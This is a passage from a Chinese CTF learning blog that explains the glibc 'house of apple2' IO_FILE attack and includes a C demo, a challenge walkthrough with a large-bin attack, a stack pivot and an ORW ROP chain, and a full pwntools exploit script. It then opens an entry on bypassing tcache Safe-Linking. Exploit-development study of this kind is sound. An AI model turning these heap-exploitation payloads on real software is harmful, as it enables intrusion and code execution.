class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>发现最终执行的是 <code>_IO_WDOALLOCATE (fp)</code> ,而这个 <code>fp</code> 就是 <code>IO_FILE</code>，因此控制参数的话只需要让 <code>flags</code> 字段为 <code>/bin/sh</code> 。</p>
<p>总结下执行到最后的位置需要绕过的检查</p>
<ol>
<li><code>_flags</code> 设置为<code>~(2 | 0x8 | 0x800)</code> ，如果是需要获取 <code>shell</code> 的话，那么可以将参数写为 <code>  sh;</code> 这样 <code>_flags</code> 既能绕过检查，又能被 <code>system</code> 函数当做参数成功执行。需要注意的是 <code>sh;</code> 前面是有两个空格的（这个值是 <code>0x3b68732020</code> ）</li>
<li><code>_wide_data-&gt;_IO_write_base</code> 设置为 <code>0</code> , <code>fp-&gt;_wide_data-&gt;_IO_buf_base</code> 设置为 <code>0</code> </li>
<li><code>fp-&gt;_mode == 0</code> 和 <code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>  ,这样即可触发 <code>_IO_OVERFLOW</code>。</li>
</ol>
<p>上面提到的是绕过的检查所需要伪造的字段，然后还有几个地方的设置如下</p>
<ol>
<li>将 <code>IO_FILE</code> 中的 <code>vtable</code> 字段改为 <code>_IO_wfile_jumps</code></li>
<li>将 <code>IO_FILE</code> 中的 <code>wide_data</code> 设置为可控堆地址，目的是控制 <code>wide_data</code> 中的 <code>write_base</code> 和 <code>buf_base</code> 为0</li>
<li>控制 <code>wide_data-&gt;wide_vtable</code> 为地址 <code>A</code>，地址 <code>A</code> 满足 <code>*(A+0x68) == system</code> （此处的 <code>system</code> 地址是自己布置的）</li>
</ol>
<p>自己写了一个 <code>demo</code>  如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Ubuntu GLIBC 2.35-0ubuntu3.1 </span></span><br><span class="line"><span class="comment">// gcc demo.c -o demo -g -w</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> libc_base=&amp;<span class="built_in">printf</span><span class="number">-0x60770</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;libc_base --------&gt; %llx\n&quot;</span>,libc_base);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> stderr_address=libc_base+<span class="number">0x21a6a0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;stderr address --------&gt; %llx\n&quot;</span>,stderr_address);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> wide_data=stderr_address+<span class="number">0xa0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;wide_data --------&gt; %llx\n&quot;</span>,wide_data);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> vtable=stderr_address+<span class="number">0xd8</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;vtable --------&gt; %llx\n&quot;</span>,vtable);</span><br><span class="line">	</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> io_wfile_jumps=libc_base+<span class="number">0x2160c0</span>;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> wide_data_write_base=*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)(wide_data)+<span class="number">0x18</span>;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> wide_data_buf_base=*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)wide_data+<span class="number">0x30</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;io_wfile_jumps --------&gt; %llx\n&quot;</span>,io_wfile_jumps);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;wide_data_write_base --------&gt; %llx\n&quot;</span>,wide_data_write_base);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;wide_data_buf_base --------&gt; %llx\n&quot;</span>,wide_data_buf_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> wide_vtable=libc_base+<span class="number">0x219980</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;wide_vtable --------&gt; %llx\n&quot;</span>,wide_vtable);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> system=libc_base+<span class="number">0x50d60</span>;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> write_base=stderr_address+<span class="number">0x20</span>;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> buf_base=stderr_address+<span class="number">0x38</span>;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> system_ptr=wide_vtable<span class="number">-8</span>;</span><br><span class="line"></span><br><span class="line">	*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)vtable=io_wfile_jumps;</span><br><span class="line">	*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)write_base=<span class="number">0</span>;</span><br><span class="line">     *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)wide_data_write_base=<span class="number">0</span>;</span><br><span class="line">     *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)wide_data_buf_base=<span class="number">0</span>;</span><br><span class="line">	*((<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)system_ptr)=system;</span><br><span class="line">	*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)wide_vtable=libc_base+<span class="number">0x219910</span>;</span><br><span class="line">	*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)stderr_address=<span class="number">0x3b68732020</span>; <span class="comment">//~(2 | 0x8 | 0x800);</span></span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301301711064.png" alt="image-20230130171112854"></p>
<h4 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h4><p>题目是 <strong>roderick</strong> 师傅在 <code>house of apple</code> 文章中的例题，下载链接在这里：<a href="https://pan.baidu.com/s/1nZIeYKqv619jMFyox-s8gQ?pwd=632r">https://pan.baidu.com/s/1nZIeYKqv619jMFyox-s8gQ?pwd=632r</a>  提取码：632r<br><strong>roderick</strong> 师傅说这个题是 <code>2.34</code> 的 <code>libc</code> ，我是直接拖到了 <code>22.04</code> 的 <code>ubuntu</code> 里，用 <code>2.35</code> 的 <code>libc</code> 打的。</p>
<h5 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h5><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020930803.png" alt="image-20230202093006528" style="zoom: 67%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020930552.png" alt="image-20230202093028442" style="zoom:50%;" />

<h5 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h5><p>程序最开始先询问了一个 <code>key</code>，这个 <code>key</code> 决定了我们申请堆块的大小。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020932796.png" alt="image-20230202093211719"></p>
<p>上面的代码说明 <code>key</code> 实际的范围是 <code>0x660 ~ 0xaa0</code></p>
<p>然后有四个功能分别是 <code>add</code> <code>delete</code> <code>read</code> <code>write</code> （如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020934204.png" alt="image-20230202093401108" style="zoom:50%;" />



<p><code>add</code> 函数中只能选择三种大小的堆块申请，分别是 <code>key</code> <code>key+0x10</code> <code>2*key</code> ，并且只能 <code>add</code> 函数只负责申请堆块，无法向申请的堆块写入数据，最多能创建 <code>0x10</code> 个堆块。</p>
<p><code>delete</code> 函数存在一个 <code>UAF</code> 漏洞，如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020938907.png" alt="image-20230202093807826" style="zoom:50%;" />

<p><code>read</code> 和 <code>write</code> 函数就是一个用于向堆块正常写入数据（没有溢出），一个可以打印堆块中 <code>0x10</code> 的数据（使用的 <code>write</code> 函数不会被 <code>\x00</code> 截断），然后各自只能执行一次</p>
<h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>这里只记录使用 <code>house of apple2</code> 的攻击手法，在 <code>house of apple1</code> 中 <strong>roderick</strong> 师傅展示了另一种的攻击方式（不过个人感觉没有 <code>apple2</code> 的利用简单），下面说一下整体的利用思路，至于具体布局结构体的细节还需要做题时自己用 <code>gdb</code> 一点一点调试出来。</p>
<h6 id="泄露-libc-和-heap-地址"><a href="#泄露-libc-和-heap-地址" class="headerlink" title="泄露 libc 和 heap 地址"></a>泄露 <code>libc</code> 和 <code>heap</code> 地址</h6><p>因为只有一次 <code>write</code> 函数执行的机会，让堆块进入 <code>large bin</code> 中泄露两个地址是不可行的，因为用的是 <code>write</code> 打印出来的前 <code>0x10</code> 个字节都是 <code>libc</code> 地址。如果让 <code>unsorted bin</code> 中有两个堆块（不能合并），去打印 <code>unnsorted bin</code> 中的堆块就能用 <code>0x10</code> 的数据泄露出 <code>libc</code> 地址和堆地址了。</p>
<h6 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h6><p>用上文提到的补充中的方法，先申请一个大的堆块，然后进入 <code>large bin</code> 中，然后篡改其 <code>bk_nextsize</code> 为 <code>target_addr-0x20</code> （此时用了唯一一次写的机会），还需要去写其他数据，这里后面再说，篡改完 <code>bk_nextsize</code> 后，再让一个略小的堆块进入 <code>large bin</code> 即可触发 <code>large bin attack</code> ，此时 <code>IO_list_all</code> 就为略小的堆块地址，但问题是我们只能控制大堆块中的数据，参考了 <strong>winmt</strong> 师傅的做法，再申请与小堆块等大的堆块就会从 <code>large bin</code> 中取出来小堆块，这样就会触发 <code>unlink</code> ，代码如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022258433.png" alt="image-20230202225821151" style="zoom:50%;" />

<p>此时这几个指针为</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022259382.png" alt="image-20230202225959295"></p>
<p>这个 <code>p-&gt;bk_nextsize</code> 是  <code>IO_list_all-0x20</code> 的地址，而触发 <code>p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize</code> 就将大堆块的地址写入了 <code>IO_list_all-0x20+0x20</code> 的位置，所以只要再申请一个和小堆块等大的堆块，触发这个 <code>unlink</code> 就可以将大堆块的地址写入 <code>IO_list_all</code> 中了（<strong>roderick</strong> 师傅和<strong>winmt</strong> 师傅都太强了）</p>
<h6 id="伪造结构体-amp-amp-布局"><a href="#伪造结构体-amp-amp-布局" class="headerlink" title="伪造结构体&amp;&amp;布局"></a>伪造结构体&amp;&amp;布局</h6><p>控制了链表头指针，就意味着接下来就可以开始伪造 <code>IO_FILE</code> 了，因为这个 <code>IO_FILE</code> 的前几个字段都无法改变（因为是堆块的 <code>prev_size</code> <code>size</code> <code>fd</code> <code>bk</code> <code>fd_nextsize</code> <code>bk_nextsize</code> 字段），这会干扰我们伪造 <code>IO_FILE</code> 的字段（比如 <code>_flags</code> 字段这里我们不可控），因此我们这个结构体只控制 <code>IO_write_base</code> 和 <code>_chain</code> 字段，我专门把 <code>IO_write_base</code> 改成 <code>IO_list_all</code> 是因为这个字段需要大于 <code>IO_write_ptr</code> 字段，才不会触发 <code>overflow</code> ，然后通过 <code>_chain</code> 遍历到下个结构体的时候去开始真正利用。（此时伪造的第一个结构体如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022310901.png" alt="image-20230202231015667" style="zoom:50%;" />



<p>接下来就要开始伪造触发 <code>overflow</code> 的这个 <code>IO_FILE</code> 结构体了，条件按照上面 <code>house of apple2</code> 中总结的伪造即可，这里伪造字段没啥可说的，只能对着 <code>gdb</code> 一点一点把偏移调出来，然后布局好，因为还要再布置一个 <code>wide_data</code> 结构体，所以调试起来要花费点时间。慢慢的按照每个条件的要求控制每个字段即可，下面直接给出最后伪造出来的结构体。</p>
<p>这是触发 <code>overflow</code> 的第二个伪造的 <code>IO_FILE</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022316010.png" alt="image-20230202231655803" style="zoom:50%;" />



<p>下面这个是伪造的 <code>_IO_wide_data</code> 结构体，因为堆块很大，所以放心布置即可</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022318082.png" alt="image-20230202231820885" style="zoom:50%;" />

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022318642.png" alt="image-20230202231830333"></p>
<p>如果要获取 <code>shell</code> 的话，那控制 <code>IO_FILE</code> 的 <code>_flags</code> 字段为参数， <code>_wide_vtable</code> 中的 <code>overflow</code> 改成 <code>system</code> 地址即可获取  <code>shell</code>。</p>
<h6 id="栈迁移-amp-amp-rop"><a href="#栈迁移-amp-amp-rop" class="headerlink" title="栈迁移&amp;&amp;rop"></a>栈迁移&amp;&amp;rop</h6><p>但是打 <code>orw</code> 的话要略微麻烦一点，我这里是采用了 <code>winmt</code> 师傅提到的一个 <a href="https://bbs.kanxue.com/thread-272098.htm">方法</a>，利用下面这段 <code>gadget</code> 打了一个栈迁移，因为 <code>rdi+0x48</code> 可控（<code>rdi</code> 就是 <code>IO_FILE</code> 的首地址），所以 <code>rbp</code> 可控，所以 <code>rax</code> 可控，所以 <code> call   QWORD PTR [rax+0x28]</code> 可以控制程序的执行流，这里的执行流去调用 <code>leave ; ret</code> 进行一个栈迁移</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svcudp_reply+26&gt;:    mov    rbp,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;svcudp_reply+30&gt;:    mov    rax,QWORD PTR [rbp+0x18]</span><br><span class="line">&lt;svcudp_reply+34&gt;:    lea    r13,[rbp+0x10]</span><br><span class="line">&lt;svcudp_reply+38&gt;:    mov    DWORD PTR [rbp+0x10],0x0</span><br><span class="line">&lt;svcudp_reply+45&gt;:    mov    rdi,r13</span><br><span class="line">&lt;svcudp_reply+48&gt;:    call   QWORD PTR [rax+0x28]</span><br></pre></td></tr></table></figure>

<p>下面是正在执行这段 <code>gadget</code> 的情况</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022329670.png" alt="image-20230202232950364" style="zoom:50%;" />

<p>下图为栈迁移后的情况，接下来触发 <code>rop</code> 链</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022330494.png" alt="image-20230202233043116" style="zoom:50%;" />



<p>最后 <code>orw</code> 的 <code>rop</code> 链如下，此时将要开始执行</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022332120.png" alt="image-20230202233224913" style="zoom:50%;" />



<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">d_a=<span class="number">0x13B9</span></span><br><span class="line">d_d=<span class="number">0x13C3</span></span><br><span class="line">d_r=<span class="number">0x13E0</span></span><br><span class="line">d_w=<span class="number">0x13FD</span> </span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">choice</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choise: &quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: \n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_data</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Message: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_data</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">p.sendlineafter(<span class="string">&quot;enter your key &gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">write_data(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Message: \n&quot;</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219ce0</span></span><br><span class="line">p.recv(<span class="number">2</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x13c0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps=libc_base+<span class="number">0x2160c0</span></span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret=libc_base+<span class="number">0x00000000000562ec</span></span><br><span class="line">magic_gadget=libc_base+<span class="number">0x16a1fa</span></span><br><span class="line">pop_rsp_ret=<span class="number">0x0000000000035732</span>+libc_base</span><br><span class="line">pop_rdi_ret=libc_base+<span class="number">0x000000000002a3e5</span></span><br><span class="line">add_rsp_ret=<span class="number">0x000000000003a889</span>+libc_base</span><br><span class="line">pop_rsi_ret=libc_base+<span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_r12_ret=libc_base+<span class="number">0x000000000011f497</span></span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr=libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rax_ret=libc_base+<span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall=libc_base+<span class="number">0xea5b9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">rop=p64(pop_rdi_ret)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0x518</span>)<span class="comment"># &#x27;flag&#x27; address</span></span><br><span class="line">rop+=p64(pop_rsi_ret)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(pop_rax_ret)</span><br><span class="line">rop+=p64(<span class="number">2</span>)</span><br><span class="line">rop+=p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">rop+=p64(pop_rdi_ret)</span><br><span class="line">rop+=p64(<span class="number">3</span>)</span><br><span class="line">rop+=p64(pop_rsi_ret)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0xb40</span>)<span class="comment"># flag store address</span></span><br><span class="line">rop+=p64(pop_rdx_r12_ret)</span><br><span class="line">rop+=p64(<span class="number">0x50</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(read_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">rop+=p64(pop_rdi_ret)</span><br><span class="line">rop+=p64(<span class="number">1</span>)</span><br><span class="line">rop+=p64(pop_rsi_ret)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0xb40</span>)<span class="comment"># flag store address</span></span><br><span class="line">rop+=p64(pop_rdx_r12_ret)</span><br><span class="line">rop+=p64(<span class="number">0x50</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(write_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wide_data=p64(<span class="number">0</span>)*<span class="number">21</span></span><br><span class="line">wide_data+=p64(leave_ret)<span class="comment">#second call</span></span><br><span class="line">wide_data+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">wide_data+=<span class="string">b&quot;./flag\x00\x00&quot;</span></span><br><span class="line">wide_data+=p64(add_rsp_ret)<span class="comment">#第二次栈迁移  原因是rop链不能破坏下面的magic_gadget</span></span><br><span class="line">wide_data+=p64(<span class="number">0</span>)</span><br><span class="line">wide_data+=p64(heap_base+<span class="number">0x450</span>-<span class="number">0x68</span>+(<span class="number">8</span>*<span class="number">29</span>))</span><br><span class="line">wide_data+=p64(magic_gadget)<span class="comment">#first call</span></span><br><span class="line">wide_data+=rop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io_file=p64(~(<span class="number">2</span> | <span class="number">0x8</span> | <span class="number">0x800</span>)+(<span class="number">1</span>&lt;&lt;<span class="number">64</span>))<span class="comment">#_flags</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#write_base &amp;&amp; write_ptr</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">io_file+=p64(heap_base+<span class="number">0x538</span>-<span class="number">0x20</span>)<span class="comment">#rbp  [rdi+0x48]</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">io_file+=p64(heap_base+<span class="number">0x450</span>)<span class="comment">#wide_data</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io_file+=p64(_IO_wfile_jumps)</span><br><span class="line"></span><br><span class="line">payload=p64(libc_base+<span class="number">0x21a1f0</span>)*<span class="number">2</span>+p64(io_list_all)+p64(io_list_all-<span class="number">0x20</span>)<span class="comment">#io_write_base控制为io_list_all 因为需要大于io_write_ptr不触发overflow</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(heap_base+<span class="number">0x370</span>)<span class="comment">#chain    指向了第一个伪造的结构体的vtable</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">14</span></span><br><span class="line">payload+=io_file</span><br><span class="line">payload+=wide_data</span><br><span class="line"></span><br><span class="line">read_data(<span class="number">0</span>,payload.ljust(<span class="number">0x880</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_w,d_r,<span class="number">0x12BC</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022334166.png" alt="image-20230202233408774"></p>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>首先感谢 <strong>roderick</strong> 师傅分享这种攻击方法，<code>house of apple2</code> 所需的条件较少，是一种很优秀的攻击方法。</p>
<p>在学习的过程中，尽量多翻看源码，捋清函数的执行流，清楚需要绕过的检查以及所伪造的字段。在实际的题目中，需要经常使用 <code>gdb</code> 调试来边调边布局结构体中的数据，自己进入调试那种状态很美妙，似乎只有自己知道自己在做什么，通过调试来预测以及验证接下来程序的变化是很享受的一件事情（尽管重复的敲击那几个按键，手会比较酸 -&gt;.-&gt; ），这种东西只可意会不可言传。</p>
<p>多动手，多思考就会离真相更近一步。</p>
<h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a href="https://bbs.kanxue.com/thread-273418.htm">https://bbs.kanxue.com/thread-273418.htm</a></p>
<p><a href="https://www.roderickchan.cn/post/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">House of Apple 一种新的glibc中IO攻击方法 (2) - roderick - record and learn! (roderickchan.cn)</a></p>
<p><a href="https://bbs.kanxue.com/thread-272098.htm">https://bbs.kanxue.com/thread-272098.htm</a></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>FSOP</tag>
        <tag>伪造IO_FILE</tag>
        <tag>orw</tag>
        <tag>large bin attack</tag>
        <tag>house of apple</tag>
      </tags>
  </entry>
  <entry>
    <title>Safe-Linking 机制的绕过</title>
    <url>/posts/501cca6.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>自从引入了 <code>tcache</code> 机制后，从 <code>2.26</code> 开始 <code>tcache poisoning</code> 就是一种简便的攻击方式，因为它不需要像 <code>fastbin attack</code> 利用那样对 <code>size</code> 检查较为严格（只能申请到 <code>malloc</code> 和 <code>_IO_2_1_stdout_</code> 上方的区域），篡改了 <code>tcache bin</code> 中堆块的 <code>next</code> 指针就相当于可以任意地址申请了 </p>
<h3 id="safe-Linking"><a href="#safe-Linking" class="headerlink" title="safe-Linking"></a>safe-Linking</h3><p>在 <code>2.32</code> 之前 <code>tcache poisoning</code> 可以说是无往不利，但到了 <code>glibc 2.32</code> 及以后，增加了 <code>safe-Linking</code> 机制，至此篡改 <code>next</code> 指针直接任意地址申请的操作便绝迹在了高版本的 <code>libc</code> 中</p>
<span id="more"></span>

<p> <code>safe-Linking</code> 就是对 <code>next</code> 指针进行了一些运算，规则是将 <strong>当前 <code>free</code> 后进入 <code>tcache bin</code> 堆块的用户地址</strong> 右移 <code>12</code> 位的值和 <strong>当前 <code>free</code> 后进入 <code>tcache bin</code> 堆块原本正常的 <code>next</code> 值</strong> 进行<strong>异或</strong> ，然后将这个值重新写回 <code>next</code> 的位置</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">#define PROTECT_PTR(pos, ptr) \</span><br><span class="line">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br></pre></td></tr></table></figure>



<p>触发这个 <code>PROTECT_PTR</code> 宏，有两种情况，第一种是当前 <code>free</code> 的堆块是第一个进入 <code>tcache bin</code> 的（此前 <code>tcache bin</code> 中没有堆块），这种情况原本 <code>next</code> 的值就是 <code>0</code> ，第二种情况则是原本的 <code>next</code> 值已经有数据了。<strong>如果是第一种情况的话，对于 <code>safe-Linking</code> 机制而言，可能并没有起到预期的作用，因为将当前堆地址右移 <code>12</code> 位和 <code>0</code> 异或，其实值没有改变，如果我们能泄露出这个运算后的结果，再将其左移 <code>12</code> 位就可以反推出来堆地址，如果有了堆地址之后，那我们依然可以篡改 <code>next</code> 指针，达到任意地址申请的效果</strong> </p>
<p>恢复 <code>next</code> 的宏为 <code>#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</code> ，其实这个宏最终还是调用了 <code>PROTECT_PTR</code> ，原理就是 <code>A=B^C ; C=A^B</code> </p>
